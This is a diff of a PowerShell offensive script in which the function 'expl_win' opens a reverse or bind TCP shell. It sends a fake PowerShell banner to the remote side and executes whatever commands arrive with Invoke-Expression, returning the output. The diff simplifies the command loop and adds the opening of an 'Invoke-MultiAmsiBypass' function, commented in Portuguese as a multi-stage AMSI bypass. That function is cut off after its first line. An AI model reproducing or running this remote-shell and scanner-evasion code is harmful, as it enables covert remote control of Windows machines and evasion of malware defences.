@@ -5,14 +5,11 @@ function expl_win
         [Parameter(Position = 0, Mandatory = $true, ParameterSetName = "reverse")]
         [Parameter(Position = 0, Mandatory = $false, ParameterSetName = "bind")]
         [String]$IPAddress,
-
         [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "reverse")]
         [Parameter(Position = 1, Mandatory = $true, ParameterSetName = "bind")]
         [Int]$Port,
-
         [Parameter(ParameterSetName = "reverse")]
         [Switch]$Reverse,
-
         [Parameter(ParameterSetName = "bind")]
         [Switch]$Bind
     )
@@ -35,58 +32,38 @@ function expl_win
 
         $stream = $client.GetStream()
         $encoding = [System.Text.Encoding]::UTF8
-        $bufferSize = 8192
-        [byte[]]$bytes = New-Object byte[] $bufferSize
+        [byte[]]$bytes = 0..65535 | % { 0 }
 
-        $banner = "Windows PowerShell running as user $env:username on $env:computername`n"
-        $banner += "Copyright (C) Microsoft Corporation. All rights reserved.`n`n"
-        $sendBytes = $encoding.GetBytes($banner)
-        $stream.Write($sendBytes, 0, $sendBytes.Length)
+        $banner = "Windows PowerShell running as user $env:username on $env:computername`r`n"
+        $banner += "Copyright (C) Microsoft Corporation. All rights reserved.`r`n`r`n"
+        $sendbytes = $encoding.GetBytes($banner)
+        $stream.Write($sendbytes, 0, $sendbytes.Length)
         $stream.Flush()
 
         $prompt = "PS $(Get-Location)> "
-        $sendBytes = $encoding.GetBytes($prompt)
-        $stream.Write($sendBytes, 0, $sendBytes.Length)
+        $sendbytes = $encoding.GetBytes($prompt)
+        $stream.Write($sendbytes, 0, $sendbytes.Length)
         $stream.Flush()
 
         while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
         {
-            $data = $encoding.GetString($bytes, 0, $i).Trim()
-            if ([string]::IsNullOrWhiteSpace($data))
+            $data = $encoding.GetString($bytes, 0, $i)
+            try
             {
-                $output = ""
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
             }
-            else
+            catch
             {
-                $Error.Clear()
-                try
-                {
-                    $output = Invoke-Expression $data *>&1 | Out-String -Width 4096
-                }
-                catch
-                {
-                    $output = "ERROR (exception): $($_.Exception.Message)`n"
-                }
-                if ([string]::IsNullOrWhiteSpace($output) -and $Error.Count -gt 0)
-                {
-                    $output = $Error[0] | Out-String
-                }
+                $sendback = "ERROR (exception): $($_.Exception.Message)`r`n"
             }
-
-            if ([string]::IsNullOrWhiteSpace($output))
-            {
-                $sendback = $prompt
-            }
-            else
-            {
-                $sendback = $output.TrimEnd() + "`n" + $prompt
-            }
-
-            $sendBytes = $encoding.GetBytes($sendback)
-            $stream.Write($sendBytes, 0, $sendBytes.Length)
+            $sendback2 = $sendback + "PS $(Get-Location)> "
+            $x = ($error[0] | Out-String)
+            $error.Clear()
+            $sendback2 = $sendback2 + $x
+            $sendbyte = $encoding.GetBytes($sendback2)
+            $stream.Write($sendbyte, 0, $sendbyte.Length)
             $stream.Flush()
         }
-
         $client.Close()
         if ($listener) { $listener.Stop() }
     }
@@ -97,6 +74,7 @@ function expl_win
     }
 }
 
+# ==================== Multi‑stage AMSI bypass (tentativas sequenciais) ====================
 function Invoke-MultiAmsiBypass
 {
     $bypasses = @(
